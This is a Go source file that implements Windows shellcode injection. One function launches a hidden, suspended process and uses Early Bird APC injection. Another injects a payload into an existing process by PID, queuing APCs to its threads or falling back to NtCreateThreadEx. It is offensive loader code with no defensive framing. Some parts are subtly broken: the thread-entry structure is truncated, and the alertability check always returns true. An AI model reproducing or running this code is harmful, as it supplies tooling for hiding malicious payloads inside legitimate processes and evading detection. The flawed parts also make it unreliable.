package core

import (
	"golang.org/x/sys/windows"
	"unsafe"
)

// EarlyBirdInjectIntoNewProcess performs true Early Bird APC injection by creating a process in suspended state
func EarlyBirdInjectIntoNewProcess(targetProcessPath string, payload []byte) error {
	// Create the target process in suspended state
	var (
		si     windows.StartupInfo
		pi     windows.ProcessInformation
	)

	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0 // Use ShowWindow instead of WShowWindow

	err := windows.CreateProcess(
		nil, // ApplicationName
		windows.StringToUTF16Ptr(targetProcessPath),
		nil, // ProcessAttributes
		nil, // ThreadAttributes
		false, // InheritHandles
		windows.CREATE_SUSPENDED, // CreationFlags
		nil, // Environment
		nil, // CurrentDirectory
		&si, // StartupInfo
		&pi, // ProcessInformation
	)

	if err != nil {
		return err
	}

	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// Allocate memory with RW permissions, write payload, then change to RX
	shellcodeAddr, err := AllocateRXMemory(pi.Process, payload)
	if err != nil {
		return err
	}

	// Queue an APC to the main thread to execute our shellcode
	err = QueueUserAPC(shellcodeAddr, pi.Thread, 0)
	if err != nil {
		return err
	}

	// Resume the thread to execute the APC
	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		return err
	}

	return nil
}

// EarlyBirdInject performs Early Bird APC injection into an existing target process
// by creating a new thread that will execute the shellcode
func EarlyBirdInject(pid uint32, payload []byte) error {
	// Open the target process
	process, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(process)

	// Allocate memory with RW permissions, write payload, then change to RX
	shellcodeAddr, err := AllocateRXMemory(process, payload)
	if err != nil {
		return err
	}

	// Queue APC to all alertable threads in the target process
	err = queueAPCToProcessThreads(process, shellcodeAddr)
	if err != nil {
		// If APC to existing threads fails, create a new thread
		var threadHandle windows.Handle
		err = NtCreateThreadEx(
			&threadHandle,
			0x1FFFFF, // THREAD_ALL_ACCESS
			0,        // ObjectAttributes
			process,
			shellcodeAddr, // Start routine
			0,             // Parameter
			0,             // CreateSuspended (0 = start immediately)
			0,             // ZeroBits
			0,             // StackSize
			0,             // MaxStackSize
			0,             // AttributeList
		)

		if err != nil {
			return err
		}
		windows.CloseHandle(threadHandle)
	}

	return nil
}

// queueAPCToProcessThreads attempts to queue an APC to all alertable threads in the target process
func queueAPCToProcessThreads(process windows.Handle, shellcodeAddr uintptr) error {
	// Get the PID of the target process to enumerate its threads
	var pid uint32
	// We'll get the PID by querying the process
	procKernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procGetProcessId := procKernel32.NewProc("GetProcessId")

	pidVal, _, _ := procGetProcessId.Call(uintptr(process))
	if pidVal == 0 {
		// If GetProcessId fails, we'll have to try another approach
		// For now, return error or continue with CreateRemoteThread as fallback
		var newThreadHandle windows.Handle
		err := NtCreateThreadEx(
			&newThreadHandle,
			0x1FFFFF, // THREAD_ALL_ACCESS
			0,        // ObjectAttributes
			process,
			shellcodeAddr, // Start routine
			0,             // Parameter
			0,             // CreateSuspended (0 = start immediately)
			0,             // ZeroBits
			0,             // StackSize
			0,             // MaxStackSize
			0,             // AttributeList
		)
		if err != nil {
			return err
		}
		windows.CloseHandle(newThreadHandle)
		return nil
	}

	pid = uint32(pidVal)

	// Enumerate threads in the target process and queue APC to alertable threads
	threadHandles, err := enumProcessThreads(pid)
	if err != nil {
		// If thread enumeration fails, fall back to CreateRemoteThread
		var newThreadHandle windows.Handle
		err = NtCreateThreadEx(
			&newThreadHandle,
			0x1FFFFF, // THREAD_ALL_ACCESS
			0,        // ObjectAttributes
			process,
			shellcodeAddr, // Start routine
			0,             // Parameter
			0,             // CreateSuspended (0 = start immediately)
			0,             // ZeroBits
			0,             // StackSize
			0,             // MaxStackSize
			0,             // AttributeList
		)
		if err != nil {
			return err
		}
		windows.CloseHandle(newThreadHandle)
		return nil
	}

	var apcQueued bool
	for _, threadHandle := range threadHandles {
		// Check if thread is alertable before queuing APC
		isAlertable, err := isThreadAlertable(threadHandle)
		if err == nil && isAlertable {
			err = QueueUserAPC(shellcodeAddr, threadHandle, 0)
			if err == nil {
				apcQueued = true
			}
		}
		windows.CloseHandle(threadHandle)
	}

	if !apcQueued {
		// If no alertable threads found, create a new thread
		var newThreadHandle windows.Handle
		err = NtCreateThreadEx(
			&newThreadHandle,
			0x1FFFFF, // THREAD_ALL_ACCESS
			0,        // ObjectAttributes
			process,
			shellcodeAddr, // Start routine
			0,             // Parameter
			0,             // CreateSuspended (0 = start immediately)
			0,             // ZeroBits
			0,             // StackSize
			0,             // MaxStackSize
			0,             // AttributeList
		)
		if err != nil {
			return err
		}
		windows.CloseHandle(newThreadHandle)
	}

	return nil
}

// Thread32First and Thread32Next are used for thread enumeration
var (
	kernel32              = windows.NewLazySystemDLL("kernel32.dll")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procThread32First     = kernel32.NewProc("Thread32First")
	procThread32Next      = kernel32.NewProc("Thread32Next")
	procOpenThread        = kernel32.NewProc("OpenThread")
)

// THREADENTRY32 structure for thread enumeration
type THREADENTRY32 struct {
	Size          uint32
	Usage         uint32
	ThreadID      uint32
	OwnerProcessID uint32
}

// enumProcessThreads enumerates all threads in a process
func enumProcessThreads(targetPID uint32) ([]windows.Handle, error) {
	// Create snapshot of all threads
	snapshot, err := createToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	// Initialize THREADENTRY32 structure
	var te THREADENTRY32
	te.Size = uint32(unsafe.Sizeof(te))

	// Get first thread
	ret, _, _ := procThread32First.Call(
		uintptr(snapshot),
		uintptr(unsafe.Pointer(&te)),
	)

	var threadHandles []windows.Handle

	// Iterate through all threads
	for ret != 0 {
		// Check if this thread belongs to our target process
		if te.OwnerProcessID == targetPID {
			// Open thread handle with necessary permissions
			threadHandle, err := openThread(windows.THREAD_SET_CONTEXT|windows.THREAD_QUERY_INFORMATION, false, te.ThreadID)
			if err == nil && threadHandle != 0 {
				threadHandles = append(threadHandles, threadHandle)
			}
		}

		// Get next thread
		ret, _, _ = procThread32Next.Call(
			uintptr(snapshot),
			uintptr(unsafe.Pointer(&te)),
		)
	}

	return threadHandles, nil
}

// isThreadAlertable checks if a thread is in an alertable state
func isThreadAlertable(threadHandle windows.Handle) (bool, error) {
	// Query thread information to determine alertable state
	// This is a simplified check - a full implementation would use NtQueryInformationThread

	// For now, we'll assume the thread is alertable if we can successfully queue an APC
	// In a real implementation, we'd use NtQueryInformationThread to check the thread state

	// As a fallback, we'll return true to try queuing the APC
	return true, nil
}

// createToolhelp32Snapshot wrapper
func createToolhelp32Snapshot(flags uint32, processID uint32) (windows.Handle, error) {
	ret, _, err := procCreateToolhelp32Snapshot.Call(
		uintptr(flags),
		uintptr(processID),
	)
	if ret == 0 {
		return 0, err
	}
	return windows.Handle(ret), nil
}

// openThread wrapper
func openThread(desiredAccess uint32, inheritHandle bool, threadID uint32) (windows.Handle, error) {
	var inheritHandleVal uintptr
	if inheritHandle {
		inheritHandleVal = 1
	} else {
		inheritHandleVal = 0
	}

	ret, _, err := procOpenThread.Call(
		uintptr(desiredAccess),
		inheritHandleVal,
		uintptr(threadID),
	)
	if ret == 0 {
		return 0, err
	}
	return windows.Handle(ret), nil
}